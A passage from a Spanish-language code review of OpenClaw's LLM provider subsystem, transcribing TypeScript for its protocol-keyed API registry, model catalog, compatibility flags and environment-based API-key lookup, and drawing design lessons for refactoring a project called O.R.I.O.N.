| Plantilla generada | Fija, determinista, sin LLM | **Adoptar**: predecible y auditable |

El desarrollo completo está en las secciones 8 y 9.

---

## 5. Registro de proveedores LLM y catálogo de modelos

### 5.1 La decisión de diseño central: el registro se indexa por PROTOCOLO, no por proveedor

`[VERIFICADO EN CÓDIGO]`

Este es el hallazgo arquitectónico más importante de toda la mitad de proveedores, y es exactamente
lo contrario de lo que hace hoy `ai/llm_provider.py` en O.R.I.O.N.

O.R.I.O.N. tiene hoy un método por *vendor*: `_ask_gemini()`, `_ask_ollama()`, `_ask_openai()`,
`_ask_deepseek()`. OpenClaw **no tiene un adaptador por vendor**. Tiene un adaptador por **forma de
API** (el "wire protocol"), y decenas de vendors comparten el mismo adaptador.

La clave del `Map` del registro es `provider.api`, no el nombre comercial del proveedor:

```ts
// packages/llm-core/src/types.ts  (líneas 5-18)

/** Provider API families with first-class request/stream adapters in OpenClaw. */
export type KnownApi =
  | "openai-completions"
  | "mistral-conversations"
  | "openai-responses"
  | "azure-openai-responses"
  | "openai-chatgpt-responses"
  | "anthropic-messages"
  | "bedrock-converse-stream"
  | "google-generative-ai"
  | "google-vertex";

/** Provider API id; custom providers can use ids outside the built-in set. */
export type Api = KnownApi | (string & {});

/** Provider id used for routing, diagnostics, and config lookups. */
export type Provider = string;
```

Nótese el contraste de tipos:

- `Api` es un **conjunto cerrado extensible** (`KnownApi | (string & {})` — el truco de TypeScript
  para tener autocompletado sobre los 9 conocidos pero admitir strings arbitrarios de plugins).
  Son **9 protocolos**.
- `Provider` es simplemente `string`. Son **decenas** (ver 5.5): `openai`, `deepseek`, `groq`,
  `cerebras`, `xai`, `openrouter`, `together`, `fireworks`, `moonshot`, `zai`, `minimax`,
  `huggingface`, `xiaomi`, `cloudflare-workers-ai`, `vercel-ai-gateway`…

Consecuencia práctica: **añadir el vendor N.º 40 no requiere escribir código**, porque
casi todos hablan `openai-completions`. Solo se añade una fila al catálogo con su `baseUrl`,
su `api` y su variable de entorno. Escribir código solo hace falta cuando aparece un
**protocolo nuevo**.

Este es el patrón que la sección 8 recomienda adoptar para REQ-015.

---

### 5.2 `packages/ai/src/api-registry.ts` — transcripción completa (119 líneas)

`[VERIFICADO EN CÓDIGO]` — archivo íntegro, es corto y es el corazón del subsistema.

```ts
// packages/ai/src/api-registry.ts

export type ApiStreamFunction = (
  model: Model,
  context: Context,
  options?: StreamOptions,
) => AssistantMessageEventStreamContract;

export type ApiStreamSimpleFunction = (
  model: Model,
  context: Context,
  options?: SimpleStreamOptions,
) => AssistantMessageEventStreamContract;

/** Provider implementation registered by core or plugins for a specific model API. */
export interface ApiProvider<
  TApi extends Api = Api,
  TOptions extends StreamOptions = StreamOptions,
> {
  /** Model API id this provider handles. */
  api: TApi;
  /** Full streaming adapter for callers that already own structured options. */
  stream: StreamFunction<TApi, TOptions>;
  /** Simple streaming adapter used by agent and plugin runtime defaults. */
  streamSimple: StreamFunction<TApi, SimpleStreamOptions>;
}

export interface RegisteredApiProvider {
  api: Api;
  stream: ApiStreamFunction;
  streamSimple: ApiStreamSimpleFunction;
}

type RegisteredApiProviderEntry = {
  provider: RegisteredApiProvider;
  sourceId?: string;
};

function wrapStream<TApi extends Api, TOptions extends StreamOptions>(
  api: TApi,
  stream: StreamFunction<TApi, TOptions>,
): ApiStreamFunction {
  return (model, context, options) => {
    if (model.api !== api) {
      throw new Error(`Mismatched api: ${model.api} expected ${api}`);
    }
    return stream(model as Model<TApi>, context, options as TOptions);
  };
}

// wrapStreamSimple es el guard análogo para la firma "simple".

/** Creates an isolated provider registry for one runtime or tenant. */
export function createApiRegistry() {
  const providers = new Map<string, RegisteredApiProviderEntry>();

  function registerApiProvider<TApi extends Api, TOptions extends StreamOptions>(
    provider: ApiProvider<TApi, TOptions>,
    /** Optional source id used to unregister all providers owned by one plugin/runtime. */
    sourceId?: string,
  ): void {
    providers.set(provider.api, {
      provider: {
        api: provider.api,
        stream: wrapStream(provider.api, provider.stream),
        streamSimple: wrapStreamSimple(provider.api, provider.streamSimple),
      },
      sourceId,
    });
  }

  function getApiProvider(api: Api): RegisteredApiProvider | undefined {
    return providers.get(api)?.provider;
  }

  function getApiProviders(): RegisteredApiProvider[] {
    return Array.from(providers.values(), (entry) => entry.provider);
  }

  function unregisterApiProviders(sourceId: string): void {
    for (const [api, entry] of providers.entries()) {
      if (entry.sourceId === sourceId) {
        providers.delete(api);
      }
    }
  }

  return {
    registerApiProvider,
    getApiProvider,
    getApiProviders,
    unregisterApiProviders,
    clearApiProviders: () => providers.clear(),
  };
}

export type ApiRegistry = ReturnType<typeof createApiRegistry>;
```

Lecturas obligatorias de esta transcripción:

1. **`createApiRegistry()` es una factoría, no un singleton global.** El comentario del código lo
   dice explícito: *"Creates an isolated provider registry for one runtime or tenant."* Cada
   runtime/tenant tiene su propio `Map`. No hay estado global mutable compartido. Esto es lo que
   hace testeable el subsistema y lo que permite que un plugin registre proveedores sin contaminar
   a otro runtime.

2. **Solo dos métodos en la interfaz `ApiProvider`: `stream` y `streamSimple`.** No hay `ask()`
   síncrono, no hay `complete()`. **Todo el contrato es streaming.** La versión "no streaming" no
   existe: quien quiera la respuesta completa consume el stream hasta el final. Esto es una
   diferencia estructural fuerte con `ai/llm_provider.py`, que es request/response.

3. **`sourceId` es el mecanismo de desregistro en bloque.** `unregisterApiProviders(sourceId)`
   borra todos los proveedores que pertenecen a un plugin. El core usa
   `BUILT_IN_API_PROVIDER_SOURCE_ID = "core:built-in"`. Es el equivalente al *hot-reload* de skills,
   pero para proveedores.

4. **`wrapStream` es un guard de coherencia, no de seguridad.** Verifica que el `model.api` que
   llega coincida con el `api` bajo el que se registró el adaptador. Es una assertion de
   programación, no una validación de input externo.

5. **`providers.set()` sin comprobación previa: el último registro gana.** Un plugin puede
   *sustituir* el adaptador `anthropic-messages` del core simplemente registrando el suyo después.
   No hay protección, ni aviso, ni prioridad. Es el mismo patrón "last-writer-wins" que se vio en
   la precedencia de skills (sección 3.1). `[HALLAZGO NEGATIVO]`

---

### 5.3 `register-builtins.ts` — registro perezoso de los 8 adaptadores del core

`[VERIFICADO EN CÓDIGO]` — `packages/ai/src/providers/register-builtins.ts`

El core registra **8** de los 9 `KnownApi` (falta `bedrock-converse-stream`, que llega por plugin).
Lo interesante no es la lista, sino el mecanismo: los adaptadores se registran **sin importarse**.

```ts
/** Source id used for built-in API provider registrations. */
export const BUILT_IN_API_PROVIDER_SOURCE_ID = "core:built-in";

// Provider modules load on first use, while callers still receive a stream synchronously.
function createLazyStream<TApi extends Api, TOptions extends StreamOptions, TStreams>(
  load: () => Promise<TStreams>,
  select: (streams: TStreams) => StreamFunction<TApi, TOptions>,
): StreamFunction<TApi, TOptions> {
  return (model, context, options) => {
    const outer = new AssistantMessageEventStream();
    load()
      .then((streams) => forwardStream(outer, select(streams)(model, context, options)))
      .catch((error: unknown) => {
        const message = createLazyLoadErrorMessage(model, error);
        outer.push({ type: "error", reason: "error", error: message });
        outer.end(message);
      });
    return outer;
  };
}

function createLazyRegistration<TApi extends Api, TOptions extends StreamOptions, TModule>(
  api: TApi,
  importModule: () => Promise<TModule>,
  select: (module: TModule) => ProviderStreams<TApi, TOptions>,
): RegisterBuiltIn {
  let streamsPromise: Promise<ProviderStreams<TApi, TOptions>> | undefined;
  const load = () => (streamsPromise ??= importModule().then(select));
  const stream = createLazyStream(load, (streams) => streams.stream);
  const streamSimple = createLazyStream<TApi, SimpleStreamOptions, ProviderStreams<TApi, TOptions>>(
    load,
    (streams) => streams.streamSimple,
  );
  return (registry) => {
    registry.registerApiProvider({ api, stream, streamSimple }, BUILT_IN_API_PROVIDER_SOURCE_ID);
  };
}

const registerBuiltIns: RegisterBuiltIn[] = [
  // Registration is transport-free; each lazy adapter owns its fetch or construction unwrap.
  createLazyRegistration(
    "anthropic-messages",
    () => import("./anthropic.js"),
    (module) => ({ stream: module.streamAnthropic, streamSimple: module.streamSimpleAnthropic }),
  ),
  createLazyRegistration(
    "openai-completions",
    () => import("./openai-completions.js"),
    (module) => ({
      stream: module.streamOpenAICompletions,
      streamSimple: module.streamSimpleOpenAICompletions,
    }),
  ),
  createLazyRegistration(
    "mistral-conversations",
    () => import("./mistral.js"),
    (module) => ({ stream: module.streamMistral, streamSimple: module.streamSimpleMistral }),
  ),
  createLazyRegistration(
    "openai-responses",
    () => import("./openai-responses.js"), /* … */
  ),
  createLazyRegistration(
    "azure-openai-responses",
    () => import("./azure-openai-responses.js"), /* … */
  ),
  createLazyRegistration(
    "openai-chatgpt-responses",
    () => import("./openai-chatgpt-responses.js"),
    (module) => ({
      stream: module.streamOpenAICodexResponses,
      streamSimple: module.streamSimpleOpenAICodexResponses,
    }),
  ),
  createLazyRegistration(
    "google-generative-ai",
    () => import("./google.js"), /* … */
  ),
  createLazyRegistration(
    "google-vertex",
    () => import("./google-vertex.js"), /* … */
  ),
];

/** Registers every built-in API provider in one runtime registry. */
export function registerBuiltInApiProviders(registry: ApiRegistry): void {
  for (const register of registerBuiltIns) {
    register(registry);
  }
}

/** Restores the built-in provider registry state for tests. */
export function resetApiProviders(registry: ApiRegistry): void {
  registry.unregisterApiProviders(BUILT_IN_API_PROVIDER_SOURCE_ID);
  registerBuiltInApiProviders(registry);
}
```

Tres detalles con valor de patrón:

- **El registro es sincrónico, la carga es asíncrona y diferida.** `registerApiProvider()` recibe
  un `stream` que todavía no sabe qué módulo va a ejecutar. El módulo real (`./anthropic.js`,
  `./google.js`…) se importa la **primera vez que alguien llama al stream**, y se memoiza en
  `streamsPromise ??= …`. Arrancar OpenClaw no importa el SDK de Anthropic ni el de Google.
- **El error de carga se degrada a un evento del stream, no a una excepción.** Si
  `import("./google.js")` falla, `createLazyLoadErrorMessage()` fabrica un `AssistantMessage` con
  `stopReason: "error"` y `usage` a cero, lo empuja al stream y lo cierra. El caller nunca ve un
  throw: ve un mensaje de asistente que falló. **Este es un patrón de degradación uniforme que vale
  la pena copiar.**
- **`resetApiProviders()` existe explícitamente "for tests"** — desregistrar por `sourceId` y
  volver a registrar. Confirma que `sourceId` está pensado para ciclos de vida completos.

---

### 5.4 El catálogo de modelos — `ModelCatalog` y su fila normalizada

`[VERIFICADO EN CÓDIGO]` — `packages/model-catalog-core/src/model-catalog-types.ts`

El registro de proveedores resuelve *cómo hablar*. El catálogo de modelos resuelve *con quién
hablar, con qué capacidades y a qué precio*. Son dos ejes ortogonales y están en paquetes
distintos.

Nótese que la lista de APIs del catálogo **no es la misma** que `KnownApi` del registro: incluye
`github-copilot` y `ollama`, que no tienen adaptador propio en el core.

```ts
/** Supported API protocols for model catalog entries. */
export const MODEL_CATALOG_APIS = [
  "openai-completions",
  "openai-responses",
  "openai-chatgpt-responses",
  "anthropic-messages",
  "google-generative-ai",
  "google-vertex",
  "github-copilot",
  "bedrock-converse-stream",
  "ollama",
  "azure-openai-responses",
] as const;

export type ModelCatalogApi = (typeof MODEL_CATALOG_APIS)[number];
```

#### 5.4.1 La entrada de un modelo

```ts
/** Provider manifest model entry. */
export type ModelCatalogModel = {
  id: string;
  name?: string;
  api?: ModelCatalogApi;
  baseUrl?: string;
  headers?: Record<string, string>;
  input?: ModelCatalogInput[];          // "text" | "image" | "document"
  reasoning?: boolean;
  contextWindow?: number;
  contextTokens?: number;
  maxTokens?: number;
  thinkingLevelMap?: ModelCatalogThinkingLevelMap;
  cost?: ModelCatalogCost;
  compat?: ModelCatalogCompatConfig;
  upstreamModel?: string;
  mediaInput?: ModelCatalogMediaInputConfig;
  status?: ModelCatalogStatus;          // "available"|"preview"|"deprecated"|"disabled"
  statusReason?: string;
  replaces?: string[];
  replacedBy?: string;
  tags?: string[];
};

/** Provider manifest catalog entry. */
export type ModelCatalogProvider = {
  baseUrl?: string;
  api?: ModelCatalogApi;
  headers?: Record<string, string>;
  /** Provider-recommended primary model id. */
  defaultModel?: string;
  /** Provider-recommended small model id for short internal utility tasks. */
  defaultUtilityModel?: string;
  models: ModelCatalogModel[];
};

/** Raw model catalog manifest shape. */
export type ModelCatalog = {
  providers?: Record<string, ModelCatalogProvider>;
  aliases?: Record<string, ModelCatalogAlias>;
  suppressions?: ModelCatalogSuppression[];
  discovery?: Record<string, ModelCatalogDiscovery>;  // "static"|"refreshable"|"runtime"
  runtimeAugment?: boolean;
};
```

Dos campos merecen atención por su utilidad conceptual:

- **`defaultUtilityModel`** — *"Provider-recommended small model id for short internal utility
  tasks."* El catálogo distingue explícitamente el modelo "grande" del modelo barato para tareas
  internas (resumir, clasificar, titular una sesión). O.R.I.O.N. hoy no tiene esta distinción y la
  necesita: usar el modelo principal para clasificar una intención es desperdicio.
- **`replaces` / `replacedBy` / `status: "deprecated"`** — el catálogo modela el **ciclo de vida y
  la migración de modelos** como dato, no como código. Cuando un modelo se deprecia, el catálogo
  apunta a su sucesor.

#### 5.4.2 `compat` — el vertedero honesto de las incompatibilidades reales

`ModelCatalogCompatConfig` es el tipo más revelador de todo el subsistema de proveedores. Es la
prueba documental de que "abstraer el LLM" no es abstraer una interfaz limpia, sino **administrar
una matriz de peculiaridades**. Transcrito íntegro:

```ts
/** Compatibility flags and provider-specific routing metadata for one model. */
export type ModelCatalogCompatConfig = {
  supportsStore?: boolean;
  supportsDeveloperRole?: boolean;
  supportsReasoningEffort?: boolean;
  /** Whether the model accepts the temperature parameter (GPT-5.6 family rejects it). */
  supportsTemperature?: boolean;
  supportsUsageInStreaming?: boolean;
  supportsStrictMode?: boolean;
  supportsJsonSchemaResponseFormat?: boolean;
  maxTokensField?: "max_completion_tokens" | "max_tokens";
  requiresToolResultName?: boolean;
  requiresAssistantAfterToolResult?: boolean;
  requiresThinkingAsText?: boolean;
  requiresReasoningContentOnAssistantMessages?: boolean;
  openRouterRouting?: ModelCatalogOpenRouterRouting;
  vercelGatewayRouting?: ModelCatalogVercelGatewayRouting;
  zaiToolStream?: boolean;
  cacheControlFormat?: "anthropic";
  sendSessionAffinityHeaders?: boolean;
  sendSessionIdHeader?: boolean;
  supportsEagerToolInputStreaming?: boolean;
  supportsLongCacheRetention?: boolean;
  supportsPromptCacheKey?: boolean;
  supportsTools?: boolean;
  /** Code-mode tier consumed by `tools.codeMode.enabled: "auto"`; absent means "capable". */
  codeMode?: "preferred" | "capable";
  requiresStringContent?: boolean;
  strictMessageKeys?: boolean;
  toolSchemaProfile?: string;
  unsupportedToolSchemaKeywords?: string[];
  toolCallArgumentsEncoding?: string;
  requiresOpenAiAnthropicToolPayload?: boolean;
  thinkingFormat?: ModelCatalogThinkingFormat;
  supportedReasoningEfforts?: string[];
  reasoningEffortMap?: Record<string, string>;
  visibleReasoningDetailTypes?: string[];
};
```

**Son 31 flags de compatibilidad.** Y el comentario de `supportsTemperature` es el mejor resumen
de por qué existe el tipo: *"(GPT-5.6 family rejects it)"*. Es decir: dos modelos del mismo vendor,
bajo el mismo protocolo `openai-responses`, difieren en si aceptan `temperature`.

Y hay 7 formatos distintos de "thinking":

```ts
export const MODEL_CATALOG_THINKING_FORMATS = [
  "openai", "openrouter", "deepseek", "together",
  "qwen", "qwen-chat-template", "zai",
] as const;

export const MODEL_CATALOG_THINKING_LEVELS = [
  "off", "minimal", "low", "medium", "high", "xhigh", "max",
] as const;
```

**Lección para O.R.I.O.N.** — la abstracción de proveedores no puede ser solo `ask(prompt) -> str`.
En el momento en que se quiera usar tool-calling, streaming o razonamiento, aparecen las
peculiaridades por modelo. OpenClaw las resuelve con **datos declarativos** (`compat` en el
catálogo) en vez de con `if provider == "deepseek"` esparcidos por el código. Ese es el patrón
correcto, y es barato de adoptar aunque O.R.I.O.N. arranque con 4 flags en vez de 31.

#### 5.4.3 La fila normalizada y las fuentes del catálogo

```ts
/** Source of a model catalog row. */
export type ModelCatalogSource =
  | "manifest"          // catálogo empaquetado con el binario
  | "provider-index"    // índice de proveedores descubribles (pre-instalación de plugin)
  | "cache"             // overlay remoto cacheado en disco
  | "config"            // definido por el usuario en su config
  | "runtime-refresh";  // consultado en vivo al proveedor (p. ej. /v1/models de Ollama)

/** Discovery lifecycle for a provider catalog. */
export type ModelCatalogDiscovery = "static" | "refreshable" | "runtime";

/** Normalized model catalog row used by runtime lookup and UI surfaces. */
export type NormalizedModelCatalogRow = {
  provider: string;
  id: string;
  ref: string;        // "provider/model"
  mergeKey: string;
  name: string;
  source: ModelCatalogSource;
  input: ModelCatalogInput[];
  reasoning: boolean;
  status: ModelCatalogStatus;
  api?: ModelCatalogApi;
  baseUrl?: string;
  headers?: Record<string, string>;
  contextWindow?: number;
  contextTokens?: number;
  maxTokens?: number;
  thinkingLevelMap?: ModelCatalogThinkingLevelMap;
  cost?: ModelCatalogCost;
  compat?: ModelCatalogCompatConfig;
  mediaInput?: ModelCatalogMediaInputConfig;
  statusReason?: string;
  replaces?: string[];
  replacedBy?: string;
  tags?: string[];
};
```

El patrón es **idéntico al de los skills**: varias fuentes con precedencia se funden en un `Map`
por `mergeKey`, y cada fila recuerda de dónde vino (`source`) para diagnóstico. Los módulos que
implementan las fuentes están en `src/model-catalog/`:

| Archivo | Rol |
|---|---|
| `bundled-catalog-stamp.ts` | sello/versión del catálogo empaquetado |
| `manifest-planner.ts` | plan de resolución del manifest |
| `pricing.ts` | cálculo de coste a partir de `ModelCatalogCost` (incluye `tieredPricing`) |
| `remote-store.ts` | persistencia del overlay remoto |
| `remote-refresh.ts` | descarga/refresco del overlay |
| `remote-overlay.ts` | fusión del overlay sobre el manifest empaquetado |
| `provider-index/` | índice de proveedores aún no instalados |

Y `suppressions` permite **ocultar** un `provider/model` bajo condiciones de configuración:

```ts
export type ModelCatalogSuppression = {
  provider: string;
  model: string;
  reason?: string;
  when?: {
    baseUrlHosts?: string[];
    providerConfigApiIn?: string[];
  };
};
```

#### 5.4.4 `ModelRegistry` — una interfaz de 4 métodos

`[VERIFICADO EN CÓDIGO]` — `src/llm/model-registry.ts`, el archivo **completo** son 10 líneas:

```ts
// Registers and resolves available LLM models for provider routing.
import type { Model } from "./types.js";

/** Registry abstraction used by model pickers and provider availability checks. */
export type ModelRegistry = {
  getAll(): Model[];
  getAvailable(): Model[];
  find(provider: string, modelId: string): Model | undefined;
  hasConfiguredAuth(model: Model): boolean;
};
```

La distinción `getAll()` vs `getAvailable()` es la misma idea que la **elegibilidad de skills**
(`requires.env` / `requires.bins`, sección 2.6): el catálogo entero existe siempre, pero solo se
ofrece lo que tiene credenciales configuradas. `hasConfiguredAuth(model)` es el predicado de filtro.

Y `src/llm/model-runtime-binding.ts` (32 líneas, transcrito completo por su elegancia) resuelve el
problema de "adjuntar el runtime al modelo sin ensuciar el modelo serializado":

```ts
const MODEL_LLM_RUNTIME = Symbol("openclaw.modelLlmRuntime");
const streamLlmRuntimes = new WeakMap<object, LlmRuntime>();

type RuntimeBoundModel = Model & { [MODEL_LLM_RUNTIME]?: LlmRuntime };

/** Carries the prepared lifecycle runtime without changing the serialized model shape. */
export function bindModelLlmRuntime(model: Model, runtime: LlmRuntime): Model {
  const bound = { ...model } as RuntimeBoundModel;
  Object.defineProperty(bound, MODEL_LLM_RUNTIME, {
    value: runtime,
    enumerable: false,   // ← invisible para JSON.stringify y para Object.keys
  });
  return bound;
}

export function getModelLlmRuntime(model: Model): LlmRuntime | undefined {
  return (model as RuntimeBoundModel)[MODEL_LLM_RUNTIME];
}

/** Associates a prepared stream entry point with the runtime that owns it. */
export function bindStreamLlmRuntime(streamFn: object, runtime: LlmRuntime): void {
  streamLlmRuntimes.set(streamFn, runtime);
}

export function getStreamLlmRuntime(streamFn: object | undefined): LlmRuntime | undefined {
  return streamFn ? streamLlmRuntimes.get(streamFn) : undefined;
}
```

`Symbol` + `enumerable: false` + `WeakMap`: el modelo sigue serializándose limpio, y el runtime
asociado no impide que se recolecte por GC. Es un truco idiomático de JS sin traducción directa
útil a Python (en Python bastaría un atributo `_runtime` o un `WeakKeyDictionary`), pero la
**intención** sí se traduce: *no contamines el objeto de datos con el objeto de ejecución*.

---

### 5.5 Autenticación unificada: API key por entorno + OAuth + credenciales ambientales

`[VERIFICADO EN CÓDIGO]` — `packages/ai/src/env-api-keys.ts` (265 líneas)

Aquí está la tabla real de vendors. Nótese que son **~35 proveedores** repartidos sobre **9
protocolos**: la prueba empírica de la tesis de 5.1.

```ts
function getApiKeyEnvVars(provider: string): readonly string[] | undefined {
  if (provider === "github-copilot") {
    return ["COPILOT_GITHUB_TOKEN"];
  }

  // ANTHROPIC_OAUTH_TOKEN takes precedence over ANTHROPIC_API_KEY
  if (provider === "anthropic") {
    return ["ANTHROPIC_OAUTH_TOKEN", "ANTHROPIC_API_KEY"];
  }

  if (provider === "moonshot") {
    return ["MOONSHOT_API_KEY", "KIMI_API_KEY"];
  }

  if (provider === "kimi" || provider === "kimi-coding") {
    return ["KIMI_API_KEY", "KIMICODE_API_KEY"];
  }

  const envMap: Record<string, string> = {
    openai: "OPENAI_API_KEY",
    meta: "MODEL_API_KEY",
    "azure-openai-responses": "AZURE_OPENAI_API_KEY",
    deepseek: "DEEPSEEK_API_KEY",
    google: "GEMINI_API_KEY",
    "google-vertex": "GOOGLE_CLOUD_API_KEY",
    groq: "GROQ_API_KEY",
    cerebras: "CEREBRAS_API_KEY",
    xai: "XAI_API_KEY",
    openrouter: "OPENROUTER_API_KEY",
    "vercel-ai-gateway": "AI_GATEWAY_API_KEY",
    zai: "ZAI_API_KEY",
    mistral: "MISTRAL_API_KEY",
    minimax: "MINIMAX_API_KEY",
    "minimax-cn": "MINIMAX_CN_API_KEY",
    moonshotai: "MOONSHOT_API_KEY",
    "moonshotai-cn": "MOONSHOT_API_KEY",
    huggingface: "HF_TOKEN",
    fireworks: "FIREWORKS_API_KEY",
    together: "TOGETHER_API_KEY",
    opencode: "OPENCODE_API_KEY",
    "opencode-go": "OPENCODE_API_KEY",
    "cloudflare-workers-ai": "CLOUDFLARE_API_KEY",
    "cloudflare-ai-gateway": "CLOUDFLARE_API_KEY",
    xiaomi: "XIAOMI_API_KEY",
    "xiaomi-token-plan-cn": "XIAOMI_TOKEN_PLAN_CN_API_KEY",
    "xiaomi-token-plan-ams": "XIAOMI_TOKEN_PLAN_AMS_API_KEY",
    "xiaomi-token-plan-sgp": "XIAOMI_TOKEN_PLAN_SGP_API_KEY",
  };

  const envVar = envMap[provider];
  return envVar ? [envVar] : undefined;
}
```

La parte conceptualmente valiosa es la **separación entre "clave de API" y "credencial ambiental"**,
declarada explícitamente en el docstring:

```ts
/**
 * Find configured environment variables that can provide an API key for a provider.
 *
 * This only reports actual API key variables. It intentionally excludes ambient
 * credential sources such as AWS profiles, AWS IAM credentials, and Google
 * Application Default Credentials.
 */
export function findEnvKeys(provider: string): string[] | undefined { … }
```

`findEnvKeys()` es para la **UI** ("¿qué variable tengo que poner?"). `getEnvApiKey()` es para el
**runtime** ("¿puedo autenticarme?"), y ahí sí acepta credenciales ambientales devolviendo el
centinela `"<authenticated>"`:

```ts
export function getEnvApiKey(provider: string): string | undefined {
  const envKeys = findEnvKeys(provider);
  if (envKeys?.[0]) {
    return getEnvValue(envKeys[0]);
  }

  // Vertex AI supports either an explicit API key or Application Default Credentials.
  // Auth is configured via `gcloud auth application-default login`.
  if (provider === "google-vertex") {
    const hasCredentials = hasVertexAdcCredentials();
    const hasProject = Boolean(
      getEnvValue("GOOGLE_CLOUD_PROJECT") || getEnvValue("GCLOUD_PROJECT"),
    );
    const hasLocation = Boolean(getEnvValue("GOOGLE_CLOUD_LOCATION"));
    if (hasCredentials && hasProject && hasLocation) {
      return "<authenticated>";
    }
  }

  if (provider === "amazon-bedrock") {
    // Amazon Bedrock supports multiple credential sources:
    // 1. AWS_PROFILE - named profile from ~/.aws/credentials
    // 2. AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY - standard IAM keys
    // 3. AWS_BEARER_TOKEN_BEDROCK - Bedrock bearer token
    // 4. AWS_CONTAINER_CREDENTIALS_RELATIVE_URI - ECS task roles
    // 5. AWS_CONTAINER_CREDENTIALS_FULL_URI - ECS task roles (full URI)
    // 6. AWS_WEB_IDENTITY_TOKEN_FILE - IRSA (IAM Roles for Service Accounts)
    if (
      getEnvValue("AWS_PROFILE") ||
      (getEnvValue("AWS_ACCESS_KEY_ID") && getEnvValue("AWS_SECRET_ACCESS_KEY")) ||
      getEnvValue("AWS_BEARER_TOKEN_BEDROCK") ||
      getEnvValue("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI") ||
      getEnvValue("AWS_CONTAINER_CREDENTIALS_FULL_URI") ||
      getEnvValue("AWS_WEB_IDENTITY_TOKEN_FILE")
    ) {
      return "<authenticated>";
    }
  }

  return undefined;
}
```

Observaciones:

- **`"<authenticated>"` es un centinela, no una credencial.** Le dice al resto del sistema "sí hay
  auth, pero no la maneja este módulo; la maneja el SDK del vendor". Evita tener que propagar
  objetos de credencial heterogéneos.
- **Precedencia declarada como orden de array**: `["ANTHROPIC_OAUTH_TOKEN", "ANTHROPIC_API_KEY"]`
  con el comentario *"ANTHROPIC_OAUTH_TOKEN takes precedence over ANTHROPIC_API_KEY"*. El OAuth
  gana sobre la API key. Mismo mecanismo para los alias de Moonshot/Kimi.
- **Ningún secreto se hardcodea**; todo sale de `process.env`, con un normalizador
  (`getEnvValue`) que hace `.trim()` y convierte `""` en `undefined`. `[VERIFICADO EN CÓDIGO]`
- El fichero contiene un *workaround* documentado para un bug de Bun (`process.env` vacío en
  binarios compilados dentro de sandbox Linux) que lee `/proc/self/environ` a mano. Es ruido de
  plataforma, no arquitectura, pero explica el tamaño del archivo.

El OAuth propiamente dicho vive en `src/llm/oauth.ts` y `src/llm/github-copilot-oauth-types.ts`,
más `packages/ai/src/providers/github-copilot-headers.ts`. El patrón es: OAuth para los proveedores
que tienen suscripción de consumidor (Anthropic Claude, ChatGPT/Codex, GitHub Copilot), API key
para los que se pagan por token.

#### 5.5.1 `provider-index` — descubrir proveedores que todavía no están instalados

`[VERIFICADO EN CÓDIGO]` — `src/model-catalog/provider-index/types.ts`

OpenClaw resuelve un problema que O.R.I.O.N. aún no tiene pero tendrá: cómo mostrar en la UI un
proveedor cuyo **plugin todavía no está instalado**, incluyendo cómo instalarlo y cómo autenticarse.

```ts
export type OpenClawProviderIndexPluginInstall = {
  clawhubSpec?: string;
  npmSpec?: string;
  defaultChoice?: "clawhub" | "npm";
  minHostVersion?: string;
  expectedIntegrity?: string;
};

export type OpenClawProviderIndexProviderAuthChoice = {
  method: string;
  choiceId: string;
  choiceLabel: string;
  choiceHint?: string;
  assistantPriority?: number;
  assistantVisibility?: "visible" | "manual-only";
  groupId?: string;
  groupLabel?: string;
  groupHint?: string;
  optionKey?: string;
  cliFlag?: string;
  cliOption?: string;
  cliDescription?: string;
  onboardingScopes?: readonly ("text-inference" | "image-generation" | "music-generation")[];
};

export type OpenClawProviderIndexProvider = {
  id: string;
  name: string;
  plugin: OpenClawProviderIndexPlugin;
  docs?: string;
  categories?: readonly string[];
  authChoices?: readonly OpenClawProviderIndexProviderAuthChoice[];
  previewCatalog?: ModelCatalogProvider;   // ← modelos visibles antes de instalar nada
};

export type OpenClawProviderIndex = {
  version: number;
  providers: Readonly<Record<string, OpenClawProviderIndexProvider>>;
};
```

`expectedIntegrity` y `minHostVersion` son el mismo tipo de control que el `install` spec de los
skills (sección 2.7). Es coherencia de diseño: **todo lo instalable declara integridad y versión
mínima de host**. Para O.R.I.O.N. esto es sobredimensionado hoy, pero es la forma correcta cuando
exista un catálogo de skills descargables.

---

### 5.6 Resumen del subsistema de proveedores

| Pieza | Archivo original | Función |
|---|---|---|
| Contrato de adaptador | `packages/ai/src/api-registry.ts` | `ApiProvider` = `{ api, stream, streamSimple }` |
| Registro por runtime | `createApiRegistry()` | `Map<Api, entry>`, aislado, con `sourceId` |
| Adaptadores del core | `packages/ai/src/providers/register-builtins.ts` | 8 registros perezosos |
| Adaptadores concretos | `packages/ai/src/providers/*.ts` | anthropic, google, google-vertex, mistral, openai-completions, openai-responses, azure-openai-responses, openai-chatgpt-responses, cloudflare, github-copilot-headers |
| Tipos de protocolo | `packages/llm-core/src/types.ts` | `KnownApi` (9), `Api`, `Provider`, `Model<TApi>` |
| Catálogo (datos) | `packages/model-catalog-core/src/model-catalog-types.ts` | `ModelCatalog*`, `compat` (31 flags) |
| Catálogo (fuentes) | `src/model-catalog/**` | manifest, overlay remoto, cache, config, runtime-refresh |
| Selección de modelo | `src/llm/model-registry.ts` | `getAll` / `getAvailable` / `find` / `hasConfiguredAuth` |
| Enlace runtime↔modelo | `src/llm/model-runtime-binding.ts` | `Symbol` no enumerable + `WeakMap` |
| Auth por entorno | `packages/ai/src/env-api-keys.ts` | ~35 vendors, centinela `"<authenticated>"` |
| Auth OAuth | `src/llm/oauth.ts`, `github-copilot-oauth-types.ts` | suscripciones de consumidor |
| Descubrimiento | `src/model-catalog/provider-index/` | proveedores no instalados + `authChoices` |

**La separación de responsabilidades que hay que retener:**

```
  ┌───────────────────┐   "¿con quién y con qué capacidades hablo?"
  │  CATÁLOGO         │   provider + model + compat + cost + status
  │  (datos)          │
  └─────────┬─────────┘
            │  model.api
            ▼
  ┌───────────────────┐   "¿cómo se habla ese protocolo?"
  │  REGISTRO DE API  │   Map<Api, {stream, streamSimple}>
  │  (código)         │   9 protocolos ← ~35 vendors
  └─────────┬─────────┘
            │
            ▼
  ┌───────────────────┐   "¿tengo credencial?"
  │  AUTH             │   env vars / OAuth / credencial ambiental
  └───────────────────┘
```

Tres módulos, tres preguntas, sin acoplamiento. `ai/llm_provider.py` hoy responde las tres a la vez
dentro de cada `_ask_*`. Ese es el objetivo del refactor de REQ-015.

---

## 6. Pregunta transversal: ¿existe failover automático entre proveedores?

### 6.0 Dictamen

**SÍ EXISTE.** `[VERIFICADO EN CÓDIGO]`

